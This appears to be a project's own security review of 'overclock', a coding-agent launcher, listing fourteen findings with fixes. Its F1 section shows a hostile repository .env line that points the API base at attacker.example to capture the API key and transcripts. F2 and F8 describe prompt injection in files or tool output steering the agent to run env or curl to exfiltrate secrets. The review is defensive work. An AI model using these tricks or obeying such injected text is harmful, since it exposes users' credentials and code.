# Security review — overclock

Review date: 2026-09-24. Scope: `bin/overclock`, `install.sh`, `scripts/postinstall.mjs`,
`extensions/overclock/*`, `test/eval/run.mjs`, and the pi runtime surfaces overclock
configures (`@earendil-works/pi-coding-agent` 0.87.1). This is a self-review, not an
external audit.

## Threat model

overclock is a coding agent: the model can read files, edit files, and run arbitrary
shell commands with the user's privileges and environment. Every request sends the
conversation transcript — including file contents and command output — to the
configured LLM endpoint. The three boundaries that matter:

1. **User's machine ↔ model endpoint.** Prompts carry source code and whatever the
   agent read; the `Authorization: Bearer` header carries `CEREBRAS_API_KEY`.
2. **Agent ↔ working directory.** Files the agent reads are model instructions;
   commands the agent runs execute as the user. A hostile or compromised repo is an
   adversarial input, not a passive one.
3. **Install/update channel ↔ user's machine.** `install.sh` pulls code from GitHub
   and npm and executes it (`postinstall.mjs` included).

## Findings summary

| ID  | Severity | Issue | Status |
|-----|----------|-------|--------|
| F1  | HIGH     | `bin/overclock` executes `./.env` from the cwd as shell code | **Fixed** |
| F2  | HIGH     | `CEREBRAS_API_KEY` (and all env secrets) inherited by every agent-run command | **Fixed** (key) / residual noted |
| F3  | MEDIUM   | Symlinked install resolves wrong root; falls back to PATH `pi` | **Fixed** |
| F4  | MEDIUM   | Installer reads API key with terminal echo on | **Fixed** |
| F5  | MEDIUM   | `OVERCLOCK_API_BASE` unvalidated — arbitrary/plain-HTTP endpoint | **Fixed** |
| F6  | MEDIUM   | Agent state dir and transcripts created with default (world-readable) perms | **Fixed** |
| F7  | MEDIUM   | `verify`/`delegate` sub-agent bash is unrestricted; "read-only" is prompt-only | **Mitigated** (docs + `--safe`) |
| F8  | MEDIUM   | No prompt-injection or untrusted-repo guardrails (documented risk) | **Fixed** (`--safe` + docs) |
| F9  | MEDIUM   | Installer/update supply chain (`curl\|bash`, `npm install`, `reset --hard`) | **Fixed** (residual: unsigned tags) |
| F10 | LOW      | `.env` not in `.gitignore` — API key committable | **Fixed** |
| F11 | LOW      | `postinstall.mjs` mutates `node_modules` after npm integrity checks | Open |
| F12 | LOW      | Version check phones home to pi.dev on every session start | Open |
| F13 | LOW      | No sub-agent turn/time/token cap — unbounded spend possible | Open |
| F14 | LOW      | Hygiene: stale `bin/` gitignore rule; `ln -sf` clobbers existing files | Partial |

---

## HIGH

### F1 — `bin/overclock` sources `./.env` from the current directory as shell

**Status: FIXED.** `./.env` is now parsed for `CEREBRAS_API_KEY` only — never
executed, and it cannot supply `OVERCLOCK_API_BASE` or any other variable, nor
override a key already configured via env or `~/.config`. The `~/.config` env
files (user-controlled, same trust as `~/.zshrc`) are still sourced so
`OVERCLOCK_*` knobs work there. Covered by an e2e regression test that plants a
hostile `.env` and asserts no execution, no endpoint override, key still loads.
Residual: repo-local `.env` can no longer provide `OVERCLOCK_*` knobs — by
design; set them in `~/.config/overclock/env` or the shell instead.

**Location:** `bin/overclock` lines 36–42.

```bash
for f in "$HOME/.config/fastcode/env" "$HOME/.config/overclock/env" "./.env"; do
    if [ -f "$f" ]; then
        set -a; . "$f"; set +a
    fi
done
```

When `CEREBRAS_API_KEY` is not already exported, the launcher **executes** `./.env`
as bash in whatever directory the user launched from. Launching a coding agent
inside an untrusted repository is a primary use case — so a repo can ship a `.env`
that runs arbitrary code the moment the user types `overclock`, before pi's project
trust prompt even appears.

A stealthier variant needs no code at all: `.env` containing
`OVERCLOCK_API_BASE=https://attacker.example/v1` is exported by `set -a`, picked up
by `extensions/overclock/index.ts` (`envVar("API_BASE")`), and redirects every
request — including the `Authorization: Bearer $CEREBRAS_API_KEY` header and all
transcript content — to the attacker. It looks like an innocuous config file.

Ordering also makes `./.env` the *last* file sourced, so it overrides the user's
`~/.config/overclock/env` for every variable, not just the key.

**Fix:**

- Remove `./.env` sourcing entirely (simplest — env vars and `~/.config` cover the
  use cases), **or**
- Replace shell sourcing with a strict parser: read only `CEREBRAS_API_KEY=<value>`
  lines, strip optional quotes, never execute. A `grep`/`while read` loop over an
  allowlist of variable names is sufficient.
- If repo-local config is genuinely wanted, trust-gate it direnv-style: only source
  a repo `.env` whose path+hash the user has previously approved.
- Whichever survives, make precedence explicit and never let repo-local files
  override `OVERCLOCK_API_BASE`/auth silently.

### F2 — `CEREBRAS_API_KEY` is exposed to every process the agent spawns

**Status: FIXED (for the API key) — residual noted.** The provider now uses pi's
`!command` apiKey form instead of `$CEREBRAS_API_KEY` env interpolation: at
request time pi execs `if [ -n "$CEREBRAS_API_KEY" ]; … else cat
$HOME/.config/overclock/key`, so the key resolves from a `0600` file. The
launcher maintains that file (writes/refreshes it whenever a key is present,
`0700` parent dir) and — once the file provably matches — `unset`s
`CEREBRAS_API_KEY` before exec'ing pi, so **nothing the agent spawns inherits
it**. If the file can't be written, the env var is kept and the `!command`'s
env branch still resolves it (graceful degradation, never a hard break).

Residual: other secrets in the user's shell env (`AWS_*`, `GITHUB_TOKEN`, …)
still reach spawned commands — that env is the user's own and is what the
commands need to function; blanket scrubbing was rejected (breaks legitimate
env-dependent builds/deploys). A deliberate env-scrub via pi's `spawnHook`
remains an option if a specific secret needs it. Tools that *want* the key can
read `~/.config/overclock/key`. Verified e2e: key file written `0600`, `Bearer
test-key` reaches the wire with the env var removed.

**Location:** pi `dist/core/tools/bash.js` (`resolveSpawnContext`,
`env ?? getShellEnv()`) and `dist/utils/shell.js` (`getShellEnv()` returns
`{...process.env}`). Only `PI_*` session vars are stripped.

Every `bash` tool call — main loop, `delegate`, `verify` — runs with the user's full
environment. `CEREBRAS_API_KEY`, `GITHUB_TOKEN`, `AWS_*`, SSH agent vars, etc. are
all readable by anything the command launches. Exfiltration paths are routine, not
exotic:

- Repo scripts the agent runs (`npm test`, `npm install` lifecycle scripts, `make`,
  a compromised dependency) can read `process.env` directly.
- Prompt injection via file contents or tool output can steer the model to run
  `env`, `curl`, or any exfil command — no approval gate exists for bash.
- Tool output echoing the environment (`env`, crash logs, `set -x` traces) also
  lands the key in the transcript sent to the provider.

**Fix:**

- **Best: keep the key out of the process environment entirely.** pi's `apiKey`
  field supports `!command` resolution (`resolve-config-value.js` executes the
  command and uses stdout). Store the key in a `0600` file (or the OS keychain) and
  register `apiKey: "!cat ~/.config/overclock/key"` — or
  `!security find-generic-password -w -s overclock` on macOS. Then
  `CEREBRAS_API_KEY` never exists in `process.env` and nothing spawned can leak it.
  The launcher still accepts `CEREBRAS_API_KEY` from the user's real env for
  compatibility, but should prefer file/keychain storage going forward.
- **Defense in depth: scrub env in spawned commands.** pi's bash tools accept a
  `spawnHook` option (`resolveSpawnContext` runs it before spawn). For sub-agents
  we control tool construction (`createBashTool(cwd, { spawnHook })` /
  `createCodingTools(cwd, { bash: { spawnHook } })`) — delete `CEREBRAS_API_KEY`
  and other `*_KEY`/`*_TOKEN`/`*_SECRET` vars there now. For the main loop, the
  bash tool comes from pi's `--tools` flag; either register a wrapped bash tool via
  the extension API if supported, or request an env-filter option upstream.
- Document the residual risk: any secret in the user's shell env is visible to
  commands the agent runs. This is the standard coding-agent tradeoff — see F8.

## MEDIUM

### F3 — Installed launcher doesn't resolve its symlink; PATH `pi` fallback

**Status: FIXED.** The launcher now walks the symlink chain (`readlink` loop,
relative targets resolved against the link's dir), so `HERE` lands on the real
install root through `~/.local/bin/overclock` and the bundled
`node_modules/.bin/pi` is found. The PATH `pi` fallback still exists for dev
setups but now prints a loud warning naming the resolved binary. Covered by an
e2e check that invokes `--version` through a symlink and asserts no PATH
fallback.

**Location:** `bin/overclock` line 5 (`BASH_SOURCE` resolution), lines 79–84
(`command -v pi` fallback); `install.sh` line 60 (`ln -sf`).

`install.sh` installs `~/.local/bin/overclock` as a symlink to
`~/.local/share/overclock/bin/overclock`. bash does **not** resolve symlinks in
`BASH_SOURCE` — verified: invoking through the symlink computes
`HERE=~/.local`, so `$HERE/node_modules/.bin/pi` doesn't exist and the launcher
falls back to `command -v pi`.

Two consequences:

1. The documented install path is broken — users get `pi not found` unless they
   happen to have pi installed globally.
2. The PATH fallback executes **whatever `pi` resolves to** — a different version,
   or a malicious binary planted earlier on PATH, running with the user's
   privileges and the exported agent env.

**Fix:**

- Resolve the real script path before computing `HERE`: loop `readlink` until
  non-symlink, or use `cd -P`/`realpath`. **Or** have `install.sh` write a shim
  instead of a symlink — `#!/bin/sh\nexec "$DEST/bin/overclock" "$@"` — which puts
  the real path in `BASH_SOURCE` for free.
- Make the PATH fallback explicit: require it only when `node_modules` is absent
  *and* print a warning naming the resolved binary, or remove it entirely and fail
  with install instructions.

### F4 — API key entered in cleartext during install

**Status: FIXED.** The prompt now uses `read -rs` (no echo) and prints a
newline afterwards. The written env file was already `chmod 600`.

**Location:** `install.sh` lines 86–91 — `read -r KEY < /dev/tty`.

`read` without `-s` echoes the key to the terminal: visible to shoulder surfers,
captured in tmux/screen scrollback, terminal logs, and screen shares.

**Fix:** `read -rs KEY < /dev/tty; printf '\n' > /dev/tty`. Also `chmod 600` is
already applied to the written file — keep that.

### F5 — `OVERCLOCK_API_BASE` accepts any endpoint, including plain HTTP

**Status: FIXED.** `resolveApiBase()` in `index.ts` validates the override:
`https://` required; `http://` accepted only for loopback hosts
(`localhost`, `127.0.0.1`, `::1`) — covers the e2e mock. Anything else is
refused with a loud stderr message and the default endpoint is used (fail
closed: never send the key to an invalid endpoint). Unit-tested for
https/loopback/refused/garbage/legacy-var cases.

**Location:** `extensions/overclock/index.ts` line 65 —
`baseUrl: envVar("API_BASE") ?? "https://api.cerebras.ai/v1"`.

The value is used verbatim. If set to `http://` (or an attacker-controlled host —
see F1), every request sends the API key and transcript in cleartext or to the
wrong party. The e2e test legitimately needs `http://127.0.0.1`.

**Fix:** validate at extension init — require `https://`, allow `http://` only for
loopback hosts (`127.0.0.1`, `::1`, `localhost`). Fail fast with a clear error
otherwise.

### F6 — Agent state directory and session transcripts use default permissions

**Status: FIXED.** `~/.overclock` and the agent dir are `chmod 700` on launch;
the metrics `logs/` dir is `chmod 700` at creation (contents inside a `700`
dir are unreachable to other users regardless of file mode). `install.sh` now
`chmod 700`s `~/.config/overclock` and `chmod 600`s the migrated legacy env
copy (it previously inherited the source's mode). The launcher's new key file
(`~/.config/overclock/key`) is written `0600`. Verified e2e: key file `0600`,
agent dir `0700`.

**Location:** `bin/overclock` line 20 (`mkdir -p "$AGENT_DIR"`), `metrics.ts` line
26 (`logs/` dir), `install.sh` lines 80–84 (legacy env copy).

- `mkdir -p` yields `~/.overclock/agent` at `0755`; session transcripts record
  everything the model read — routinely `.env` files, keys, proprietary code —
  world-readable on multi-user systems.
- `cp "$LEGACY_ENV_FILE" "$ENV_FILE"` preserves the source's mode; if the legacy
  file was `0644`, the migrated copy of the API key is too (`chmod 600` is only
  applied on the fresh-write path).

**Fix:** `install -d -m 700 "$AGENT_DIR"` (or `chmod 700` after `mkdir -p`), same
for `~/.config/overclock`; `chmod 600 "$ENV_FILE"` after the `cp`; `chmod 700` on
`logs/` at creation. Consider `0600` on new session files if pi doesn't set it.

### F7 — `verify`/`delegate` sub-agents run unrestricted bash; "read-only" is a prompt rule

**Status: MITIGATED — capability model unchanged by design.** verify needs bash
to run tests/builds, and delegate needs full coding tools — restriction by
regex would be security theater. Mitigations shipped: (a) F2 removes the API
key from the environment these tools inherit; (b) `overclock --safe` excludes
`delegate`, `verify`, `bash`, `write`, `edit` entirely — the only true
capability boundary; (c) README documents which agents can modify state.
`explore` remains the only tool-surface-restricted agent (no write/exec at
all). Open follow-up if ever needed: pi's `spawnHook`/`commandPrefix` could
sandbox sub-agent bash (`sandbox-exec`/`bwrap`), at the cost of portability.

**Location:** `extensions/overclock/subagents.ts` lines 138–143.

`verify` gets `createReadOnlyTools + createBashTool`; `delegate` gets
`createCodingTools` (bash+write+edit). VERIFY_PROMPT instructs "Never modify
files" — but nothing enforces it; bash can write, delete, and run anything. A
prompt-injected or misbehaving verify agent has full write access despite the
"verification" framing. (`explore` is fine — its tool surface genuinely has no
write/exec capability.)

**Fix:**

- Document honestly: verify/delegate can modify the workspace; the prompt is a
  guideline, not a boundary.
- Apply the F2 `spawnHook` env-scrub here — we own these tool constructors.
- Optionally sandbox sub-agent bash via `options.bash.commandPrefix` (e.g.
  `sandbox-exec`/`bwrap` profile denying writes outside the cwd) or a
  `spawnHook` that restricts `cwd`.
- Keep the tool-surface principle: enforce capabilities in code, not prose.

### F8 — No prompt-injection guardrails; untrusted-repo use is unrestricted

**Status: FIXED** (guardrails added). `overclock --safe` runs the session with
`read,grep,find,ls,explore` only — no bash, no writes, no delegate/verify —
so a hostile repo can waste tokens but cannot execute or modify. The flag is
consumed by the launcher (pi never sees it) and args after `--` stay prompt
text. README now carries a Security section: file contents are model
instructions; use `--safe` (or a container) in untrusted repos; see
SECURITY.md for the full review. Residual: prompt injection in *default* mode
is inherent to coding agents — the control is choosing the mode.

**Location:** whole-agent design — `bin/overclock` line 89
(`--tools read,write,edit,bash,...`).

pi's project trust gate controls *project resources/extensions*, not command
execution: the agent runs bash/write with no per-command approval in any
directory. File contents and tool outputs are instructions to the model — a
hostile repo, malicious dependency README, or injected web/tool content can steer
the agent to run attacker commands (and F2 makes the payload valuable). The
context-budget transform deduplicates but does not sanitize content.

This is largely inherent to coding agents — the finding is that overclock doesn't
document the boundary or offer a reduced-capability mode.

**Fix:**

- Document in README: run overclock only in repos you'd trust with your
  credentials; for untrusted code, run inside a container/VM/disposable user.
- Add a safe mode: `--safe`/`--no-bash` dropping `bash,write,edit,delegate,verify`
  from `--tools` for Q&A-only sessions (cheap to implement — the tool list is
  already a launcher flag).
- Longer term: investigate pi's approval/permission hooks for per-command
  confirmation on sensitive patterns (`curl`, `env`, writes outside cwd).

### F9 — Install/update supply chain

**Status: FIXED — residual noted.** `install.sh` now uses `npm ci --omit=dev`
(exact lockfile reproduction, fails on drift instead of resolving fresh
ranges), no longer passes `--no-audit` (advisories surface in output), and
prints "(local changes are discarded)" before `git reset --hard`. Residual:
the `curl | bash` trust model is unchanged — installing/updating still executes
code from this repo + npm; a pinned-tag + checksum install path and signed
commits remain future hardening once the project has external users.

**Location:** `install.sh` (whole file); README one-liner `curl | bash`.

- `curl | bash` executes remote code sight-unseen — standard risk for the
  pattern; HTTPS protects in transit, the trust is github.com/srawlin + npm.
- Updates `git fetch + reset --hard` then `npm install` (which executes
  `postinstall.mjs` and dependency install scripts). A compromised repo or npm
  account yields RCE on every update.
- `npm install` honors the lockfile but doesn't hard-verify it; `--no-audit`
  suppresses vulnerability signal.
- `git clone --depth 1` provides no tag/commit pinning or signature verification.

**Fix:**

- Use `npm ci --omit=dev` — exact lockfile reproduction, fails on drift. Keep or
  surface `npm audit` output for high-severity advisories.
- Offer a pinned install path: tag/release + published checksum
  (`OVERCLOCK_REF=<tag>` + `sha256 -c` of the tarball).
- Document the trust assumption in README: installing/updating executes code
  from this repo and npm; the SSH fallback covers the private-repo case.
- Consider signed commits/tags once the project has external users.

## LOW

### F10 — `.env` not gitignored

**Status: FIXED.** `.gitignore` now has `.env*` with an `!.env.example`
exception, and the stale `bin/` rule (which silently ignored new files under
`bin/` despite `bin/overclock` being tracked) is removed.

**Location:** `.gitignore` (missing `.env`).

The launcher reads `./.env` for the API key; a user who creates one in the repo
and runs `git add -A` commits `CEREBRAS_API_KEY`. **Fix:** add `.env*` with
`!.env.example`. (Also note the stale `bin/` entry — `bin/overclock` is tracked,
but new files under `bin/` are silently ignored by `git add .`; remove it.)

### F11 — `postinstall.mjs` mutates `node_modules` after npm integrity checks

**Location:** `scripts/postinstall.mjs` (piConfig write + dist string patches).

The patches are applied post-install, so installed files differ from the
published tarballs — integrity scanners and corporate auditors will see drift and
may flag it as tampering. The approach is a documented design tradeoff (pi ships
the `piConfig` hook intentionally), and the script is our own code — but note it
for downstream consumers: patches are additive/idempotent, re-applied each
install, and missed strings degrade to cosmetic issues only. Keep them additive;
never patch auth/networking logic.

### F12 — Version check phones home to pi.dev

**Location:** `extensions/overclock/version-check.ts` — `fetch` on every
`session_start`.

Leaks launch timing and IP to a third-party endpoint. Mitigations already present:
HTTPS, 8s timeout, failure-silent, no data sent beyond the GET, `PI_OFFLINE`
honored. **Fix (optional):** also honor `OVERCLOCK_NO_UPDATE_CHECK=1` for parity
with pi's own kill-switch convention, and document the call.

### F13 — No sub-agent turn/time/token budget

**Location:** `extensions/overclock/subagents.ts` — `agent.prompt(task)` runs
until the model stops.

`MAX_CONCURRENT=3` and TPM pacing bound *rate*, not *total*: a looping or stuck
sub-agent burns quota indefinitely (real dollars). **Fix:** cap turns and/or
elapsed time — increment the existing `turn_end` counter and `agent.abort()` past
a limit (`OVERCLOCK_SUBAGENT_MAX_TURNS`, default ~25), plus a hard timeout.
Consider a run-level token ceiling for the main loop too.

### F14 — Minor hygiene

**Status: PARTIAL** — the stale `bin/` gitignore rule was removed under F10,
and the `reset --hard` update path now prints "(local changes are discarded)"
under F9. Remaining open items:

- `install.sh` line 60: `ln -sf` silently overwrites an existing
  `~/.local/bin/overclock` regular file. Check-and-warn first.
- `bin/overclock` line 70: the `--session` guard treats any next-arg starting
  with `-` as missing — fine for IDs, but note `--session-dir -weird-path` can't
  be expressed (edge case; `--session-dir=-path` form unaffected).

---

## What's already done well

- `chmod 600` on freshly written key files; `apiKey: "$CEREBRAS_API_KEY"` keeps
  the literal key out of settings.json and code.
- `explore` sub-agent's read-only surface is enforced by tool set, not prose.
- Metrics log is numbers-only — no message content, no keys, no commands.
- `GIT_TERMINAL_PROMPT=0` prevents credential-prompt hangs; HTTPS-first clone.
- Sub-agent concurrency cap + TPM pacing bound request rate.
- Unknown model refs fall back to the main model instead of a null deref.
- `set -euo pipefail`, `--`-aware arg validation, exec-bit hygiene.
- `PI_OFFLINE` honored; version check is HTTPS, time-bounded, failure-silent.
- Extension path is fixed to the install tree — cwd can't inject an extension.

## Reporting

This is a personal project; there is no SLA. Report vulnerabilities via a GitHub
private security advisory on `srawlin/overclock`, or open an issue without
secrets/exploit detail. Include: affected file/function, reproduction, and impact.
Do not file issues containing your API key or session transcripts — transcripts
record file contents verbatim and may contain secrets.
